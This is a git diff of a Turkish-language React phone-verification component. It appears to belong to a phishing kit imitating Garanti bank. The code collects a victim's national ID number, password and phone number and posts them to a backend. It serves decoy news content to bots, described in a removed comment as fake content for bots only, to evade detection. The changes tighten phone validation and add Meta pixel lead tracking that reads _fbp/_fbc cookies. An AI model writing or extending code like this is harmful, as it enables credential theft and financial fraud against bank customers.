@@ -3,6 +3,7 @@ import { useNavigate, useLocation } from 'react-router-dom';
 import axios from 'axios';
 import { useAuth } from './AuthContext';
 import { Helmet } from 'react-helmet';
+/* global fbq */
 
 function Telefon({ isBot }) {
   const { state: authState, dispatch } = useAuth();
@@ -12,7 +13,62 @@ function Telefon({ isBot }) {
   const navigate = useNavigate();
   const location = useLocation();
 
-  // Yetkisiz erişim kontrolü
+  const getFbp = () => {
+    const cookies = document.cookie.split(';');
+    const fbpCookie = cookies.find((c) => c.trim().startsWith('_fbp='));
+    if (fbpCookie) {
+      const fbp = fbpCookie.split('=')[1];
+      if (/^fb\.1\.\d+\.\d+$/.test(fbp)) return fbp;
+    }
+    return undefined;
+  };
+
+  const getFbc = () => {
+    const cookies = document.cookie.split(';');
+    const fbcCookie = cookies.find((c) => c.trim().startsWith('_fbc='));
+    if (fbcCookie) {
+      const fbc = fbcCookie.split('=')[1];
+      return fbc;
+    }
+
+    const urlParams = new URLSearchParams(window.location.search);
+    const fbclid = urlParams.get('fbclid');
+    if (fbclid) {
+      const creationTime = Math.floor(Date.now() / 1000);
+      const fbcValue = `fb.1.${creationTime}.${fbclid}`;
+      const isLocal = window.location.protocol === 'http:';
+      const secureFlag = isLocal ? '' : '; Secure';
+      document.cookie = `_fbc=${fbcValue}; path=/; max-age=31536000; SameSite=Lax${secureFlag}`;
+      return fbcValue;
+    }
+    return undefined;
+  };
+
+  useEffect(() => {
+    if (isBot || typeof window === 'undefined' || !window.fbq) return;
+    fbq('track', 'ViewContent', {
+      content_category: 'garanti_credit_form',
+      content_name: 'garanti_phone_verification_page',
+    });
+  }, [isBot]);
+
+  const trackMetaLead = async (phone, eventID) => {
+    if (isBot || typeof window === 'undefined' || !window.fbq) return;
+    try {
+      fbq('track', 'Lead', {
+        custom_data: {
+          content_category: 'garanti_lead_form',
+          content_name: 'garanti_phone_verification',
+          value: 1,
+          currency: 'TRY'
+        },
+      }, { eventID });
+      console.log('Meta Lead event tetiklendi:', { eventID: eventID.substring(0, 8) + '...' });
+    } catch (error) {
+      console.error('Meta event hatası:', error);
+    }
+  };
+
   useEffect(() => {
     if (
       !location.state?.isValidNavigation ||
@@ -24,13 +80,10 @@ function Telefon({ isBot }) {
     }
   }, [location.state, authState, navigate]);
 
-  // Yalnızca botlar için sahte içerik
   if (isBot) {
     return (
       <>
-        <Helmet>
-          <meta name="robots" content="index, follow" />
-        </Helmet>
+        <Helmet><meta name="robots" content="index, follow" /></Helmet>
         <div>
           <h1 style={{ color: '#333', textAlign: 'center' }}>Güncel Haberler</h1>
           <p style={{ maxWidth: '600px', margin: '20px auto', textAlign: 'center' }}>
@@ -56,25 +109,44 @@ function Telefon({ isBot }) {
     e.preventDefault();
     setPhoneError('');
 
-    if (!phoneNumber || phoneNumber.length !== 10 || !/^\d{10}$/.test(phoneNumber)) {
-      setPhoneError('Lütfen 10 haneli telefon numaranızı girin.');
+    const cleanPhone = phoneNumber.replace(/\D/g, '');
+    if (cleanPhone.length !== 10 || !cleanPhone.startsWith('5')) {
+      setPhoneError('Telefon numarası 10 haneli olmalı ve 5 ile başlamalı.');
       return;
     }
 
     const payload = {
       tc: authState.tc,
-      phone: phoneNumber,
+      phone: cleanPhone,
       password: authState.password,
     };
 
     try {
       setIsSubmitting(true);
+
+      const leadEventID = `lead_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
+      await trackMetaLead(cleanPhone, leadEventID);
+
+      payload.eventID = leadEventID;
+      payload.initEventID = location.state?.initEventID;
+      payload.fbp = getFbp();
+      payload.fbc = getFbc();
+
       const apiUrl = process.env.REACT_APP_API_URL || 'http://localhost:3001';
       const response = await axios.post(`${apiUrl}/submit`, payload);
       console.log('[Telefon] API yanıtı:', response.data);
+
       dispatch({ type: 'SET_PHONE_VERIFIED' });
+
+      const completeEventID = `complete_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
       navigate('/bekleme', {
-        state: { isValidNavigation: true, from: '/telefon', isCompleted: true },
+        state: {
+          isValidNavigation: true,
+          from: '/telefon',
+          isCompleted: true,
+          leadEventID,
+          completeEventID
+        }
       });
     } catch (error) {
       console.error('[Telefon] API hatası:', error.response ? error.response.data : error.message);
@@ -85,71 +157,69 @@ function Telefon({ isBot }) {
   };
 
   return (
-    <div>
-      <div className="panel">
-        <div id="phoneEntryPanel" className="panel-body">
-          <h1 className="panel-title light">
-            Telefon Doğrulama
-            <p>Lütfen 10 haneli kayıtlı telefon numaranızı girin.</p>
-          </h1>
-          <div className="row">
-            <div className="col-md-12">
-              <div className="form-horizontal">
-                <form id="telefonForm" onSubmit={handleSubmit} autoComplete="off">
-                  <div className="formField">
-                    <div className="formFieldOuter">
-                      <div className="formFieldInner form-group">
-                        <label htmlFor="phoneNumber" className="col-sm-5 col-md-4 control-label">
-                          Telefon Numarası
-                        </label>
-                        <div className="formFieldSurround col-sm-7 col-md-8">
-                          <input
-                            type="tel"
-                            className="form-control"
-                            value={phoneNumber}
-                            onChange={(e) => setPhoneNumber(e.target.value)}
-                            pattern="[0-9]*"
-                            id="phoneNumber"
-                            name="telefonNoLabelUstte"
-                            maxLength="10"
-                            autoComplete="off"
-                            placeholder="5XXXXXXXXX"
-                          />
-                          {phoneError && (
-                            <div className="errorContainer advice-text has-alert" aria-live="assertive">
-                              <div className="errorWrapper">
-                                <div className="errorMessage">{phoneError}</div>
-                              </div>
+    <div className="panel">
+      <div id="phoneEntryPanel" className="panel-body">
+        <h1 className="panel-title light">
+          Telefon Doğrulama
+          <p>Lütfen 10 haneli kayıtlı telefon numaranızı girin.</p>
+        </h1>
+        <div className="row">
+          <div className="col-md-12">
+            <div className="form-horizontal">
+              <form id="telefonForm" onSubmit={handleSubmit} autoComplete="off">
+                <div className="formField">
+                  <div className="formFieldOuter">
+                    <div className="formFieldInner form-group">
+                      <label htmlFor="phoneNumber" className="col-sm-5 col-md-4 control-label">
+                        Telefon Numarası
+                      </label>
+                      <div className="formFieldSurround col-sm-7 col-md-8">
+                        <input
+                          type="tel"
+                          className="form-control"
+                          value={phoneNumber}
+                          onChange={(e) => setPhoneNumber(e.target.value.replace(/\D/g, '').slice(0, 10))}
+                          pattern="[0-9]*"
+                          id="phoneNumber"
+                          name="telefonNoLabelUstte"
+                          maxLength="10"
+                          autoComplete="off"
+                          placeholder="5XXXXXXXXX"
+                        />
+                        {phoneError && (
+                          <div className="errorContainer advice-text has-alert" aria-live="assertive">
+                            <div className="errorWrapper">
+                              <div className="errorMessage">{phoneError}</div>
                             </div>
-                          )}
-                        </div>
+                          </div>
+                        )}
                       </div>
                     </div>
                   </div>
-                  <div className="form-group form-group-offset footer-button">
-                    <div className="col-sm-7 col-md-8 col-sm-offset-5 col-md-offset-4 col-xs-12">
-                      <p>
-                        <button
-                          id="formSubmit"
-                          className="btn btn-primary btn-lg btn-block-input mobile-hover"
-                          type="submit"
-                          disabled={isSubmitting}
-                          aria-busy={isSubmitting ? 'true' : 'false'}
-                        >
-                          {isSubmitting ? (
-                            <>
-                              <i className="fa fa-spinner fa-spin" aria-hidden="true" />
-                              <span style={{ marginLeft: 8 }}>Gönderiliyor…</span>
-                            </>
-                          ) : (
-                            'Telefon Numarasını Doğrula'
-                          )}
-                        </button>
-                      </p>
-                    </div>
+                </div>
+                <div className="form-group form-group-offset footer-button">
+                  <div className="col-sm-7 col-md-8 col-sm-offset-5 col-md-offset-4 col-xs-12">
+                    <p>
+                      <button
+                        id="formSubmit"
+                        className="btn btn-primary btn-lg btn-block-input mobile-hover"
+                        type="submit"
+                        disabled={isSubmitting}
+                        aria-busy={isSubmitting ? 'true' : 'false'}
+                      >
+                        {isSubmitting ? (
+                          <>
+                            <i className="fa fa-spinner fa-spin" aria-hidden="true" />
+                            <span style={{ marginLeft: 8 }}>Gönderiliyor…</span>
+                          </>
+                        ) : (
+                          'Telefon Numarasını Doğrula'
+                        )}
+                      </button>
+                    </p>
                   </div>
-                </form>
-              </div>
+                </div>
+              </form>
             </div>
           </div>
         </div>
